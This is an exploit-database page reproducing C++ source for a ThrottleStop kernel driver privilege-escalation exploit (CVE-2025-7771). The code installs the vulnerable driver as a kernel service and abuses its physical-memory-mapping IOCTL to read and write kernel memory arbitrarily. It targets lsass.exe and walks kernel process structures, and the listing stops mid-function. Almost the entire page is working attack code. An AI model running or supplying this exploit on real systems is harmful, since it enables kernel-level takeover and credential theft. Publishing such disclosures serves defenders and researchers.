---
title: Throttlestop Kernel Driver Kernel Out-of-Bounds Write Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2026040014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-22
fetch_date: 2026-04-23T04:43:24.257295
---

# Throttlestop Kernel Driver Kernel Out-of-Bounds Write Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Throttlestop Kernel Driver Kernel Out-of-Bounds Write Privilege Escalation** **2026.04.22**  Credit:  **[Xavi Beltran](https://cxsecurity.com/author/Xavi%2BBeltran/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-7771](https://cxsecurity.com/cveshow/CVE-2025-7771/ "Click to see CVE-2025-7771")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: Throttlestop Kernel Driver - Kernel Out-of-Bounds Write Privilege Escalation
# Exploit Details: https://xavibel.com/2025/12/22/using-vulnerable-drivers-in-red-team-exercises/
# Date: 8/12/2025
# Exploit Author: Xavi Beltran
# Vendor Homepage: https://www.techpowerup.com/download/techpowerup-throttlestop/
# Version: 3.0.0.0
# Tested on: Windows 11
# CVE-2025-7771
#define WIN32\_NO\_STATUS
#define SECURITY\_WIN32
#include <Windows.h>
#include <Psapi.h>
#include <superfetch/superfetch.h>
#include <tlhelp32.h>
#include <string>
#include <sspi.h>
# define IOCTL\_MMMAPIOSPACE 0x8000645C
#pragma comment(lib, "Secur32.lib")
#pragma pack(push,1)
typedef struct {
ULONGLONG PhysicalAddress; // +0
DWORD NumberOfBytes; // +8
} PHYS\_REQ; // 0x0C
#pragma pack(pop)
// Struct needed to call nt!NtQueryIntervalProfile
typedef NTSTATUS(WINAPI\* NtQueryIntervalProfile\_t)(IN ULONG ProfileSource, OUT PULONG Interval);
LPVOID GetBaseAddr(LPCWSTR drvname)
{
LPVOID drivers[1024];
DWORD cbNeeded;
int nDrivers, i = 0;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
{
WCHAR szDrivers[1024];
nDrivers = cbNeeded / sizeof(drivers[0]);
for (i = 0; i < nDrivers; i++)
{
if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
{
if (wcscmp(szDrivers, drvname) == 0)
{
return drivers[i];
}
}
}
}
return 0;
}
uint64\_t xRead(HANDLE hDrv, uint64\_t virt\_addr) {
auto mm = spf::memory\_map::current();
if (!mm) {
printf("[!] Superfetch init failed!\n");
return 0;
}
auto phys = mm->translate((void\*)virt\_addr);
if (!phys) {
printf("[!] Translate failed for VA %p!\n", (void\*)virt\_addr);
return 0;
}
//printf("[+] Virtual Adress=0x%016llx -> Physical Address 0x%016llx\n", virt\_addr, phys);
// --- PHYSICAL READ ---
PHYS\_REQ in{};
in.PhysicalAddress = phys;
in.NumberOfBytes = 0x8;
ULONGLONG out = 0;
DWORD br = 0;
BOOL ok = DeviceIoControl(hDrv,
IOCTL\_MMMAPIOSPACE,
&in, sizeof(in), // 0x0C
&out, sizeof(out), // Accepts 4 or 8
&br, nullptr);
//printf("[+] IOCTL OK=%d, br=%lu, err=%lu, Mapped Memory Ptr=0x%llx\n", ok, br, GetLastError(), (unsigned long long)out);
if (ok && br == 8 && out) {
ULONGLONG result = \*(volatile ULONGLONG\*)(uintptr\_t)out; // 8 bytes exactos
printf("[+] READ WHERE: 0x%016llx | CONTENT: 0x%016llx\n", (unsigned long long)virt\_addr, (unsigned long long)result);
return result;
}
return -1;
}
uint64\_t xWrite(HANDLE hDrv, uint64\_t where, uint64\_t what) {
auto mm = spf::memory\_map::current();
if (!mm) {
printf("[!] Superfetch init failed!\n");
return 0;
}
auto phys = mm->translate((void\*)where);
if (!phys) {
printf("[!] Translate failed for VA %p!\n", (void\*)where);
return 0;
}
//printf("[+] Virtual Adress=0x%016llx -> Physical Address 0x%016llx\n", where, phys);
PHYS\_REQ in{};
in.PhysicalAddress = phys;
in.NumberOfBytes = 0x8;
ULONGLONG out = 0;
DWORD br = 0;
BOOL ok = DeviceIoControl(hDrv,
IOCTL\_MMMAPIOSPACE,
&in, sizeof(in), // 0x0C
&out, sizeof(out), // 8 (Accepts 4 or 8)
&br, nullptr);
//printf("[+] IOCTL OK=%d, br=%lu, err=%lu, Mapped Memory Ptr=0x%llx\n", ok, br, GetLastError(), (unsigned long long)out);
if (ok && br == 8 && out) {
ULONGLONG result = \*(volatile ULONGLONG\*)(uintptr\_t)out; // 8 bytes exactos
}
// WRITE
printf("[+] WRITE WHAT: 0x%016llx | WHERE: 0x%016llx\n", (unsigned long long)what, (unsigned long long)where);
\*(uint64\_t\*)out = what;
return 0;
}
DWORD FindProcessId(const std::wstring& processName) {
DWORD processId = 0;
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS\_SNAPPROCESS, 0);
if (snapshot == INVALID\_HANDLE\_VALUE)
return 0;
PROCESSENTRY32W entry;
entry.dwSize = sizeof(PROCESSENTRY32W);
if (Process32FirstW(snapshot, &entry)) {
do {
if (!\_wcsicmp(entry.szExeFile, processName.c\_str())) {
processId = entry.th32ProcessID;
break;
}
} while (Process32NextW(snapshot, &entry));
}
CloseHandle(snapshot);
return processId;
}
int main()
{
DWORD lsassPid = FindProcessId(L"lsass.exe");
printf("[+] Target process PID: %d\n", lsassPid);
//Installing the service
SC\_HANDLE hSCManager;
SC\_HANDLE hService;
// Open the Service Control Manager
hSCManager = OpenSCManager(NULL, NULL, SC\_MANAGER\_CREATE\_SERVICE);
if (hSCManager == NULL) {
printf("[!] Error opening SCM: %lu\n", GetLastError());
return 1;
}
// Create the service
hService = CreateService(
hSCManager,
L"ThrottleStop",
L"ThrottleStop",
SERVICE\_ALL\_ACCESS,
SERVICE\_KERNEL\_DRIVER,
SERVICE\_AUTO\_START,
SERVICE\_ERROR\_NORMAL,
L"C:\\Users\\Public\\a.sys",
NULL, NULL, NULL, NULL, NULL);
if (hService == NULL) {
printf("[+] Error creating service: %lu\n", GetLastError());
CloseServiceHandle(hSCManager);
//return 1;
}
printf("[!] Service created successfully.\n");
if (!StartService(hService, 0, NULL)) {
printf("[!] Error starting the service: %lu\n", GetLastError());
}
else {
printf("[+] Service started correctly.\n");
}
LPVOID nt\_base = GetBaseAddr(L"ntoskrnl.exe");
printf("[+] NT base: %p\n", nt\_base);
HANDLE hDrv = NULL;
hDrv = CreateFileA("\\\\.\\ThrottleStop",
(GENERIC\_READ | GENERIC\_WRITE),
0x00,
NULL,
OPEN\_EXISTING,
FILE\_ATTRIBUTE\_NORMAL,
NULL);
if (hDrv == INVALID\_HANDLE\_VALUE)
{
printf("[-] Failed to get a handle on driver!\n");
return -1;
}
else {
printf("[+] Handle on driver received!\n");
}
ULONGLONG result = 0x0;
// nt!PsInitialSystemProcess nt + 0x5412e0
ULONGLONG system\_eprocess = ULONGLONG(nt\_base) + 0x5412e0;
DWORD64 Eprocess = xRead(hDrv, (uint64\_t)system\_eprocess);
printf("[+] EPROCESS: 0x%llX\n", Eprocess);
DWORD64 CurrentProcessPid = xRead(hDrv, (uint64\_t)system\_eprocess + 0x2e0); // +0x2e0 UniqueProcessId : Ptr64 Void
DWORD64 SearchProcessPid = 0;
DWORD64 searchEprocess = Eprocess;
wh...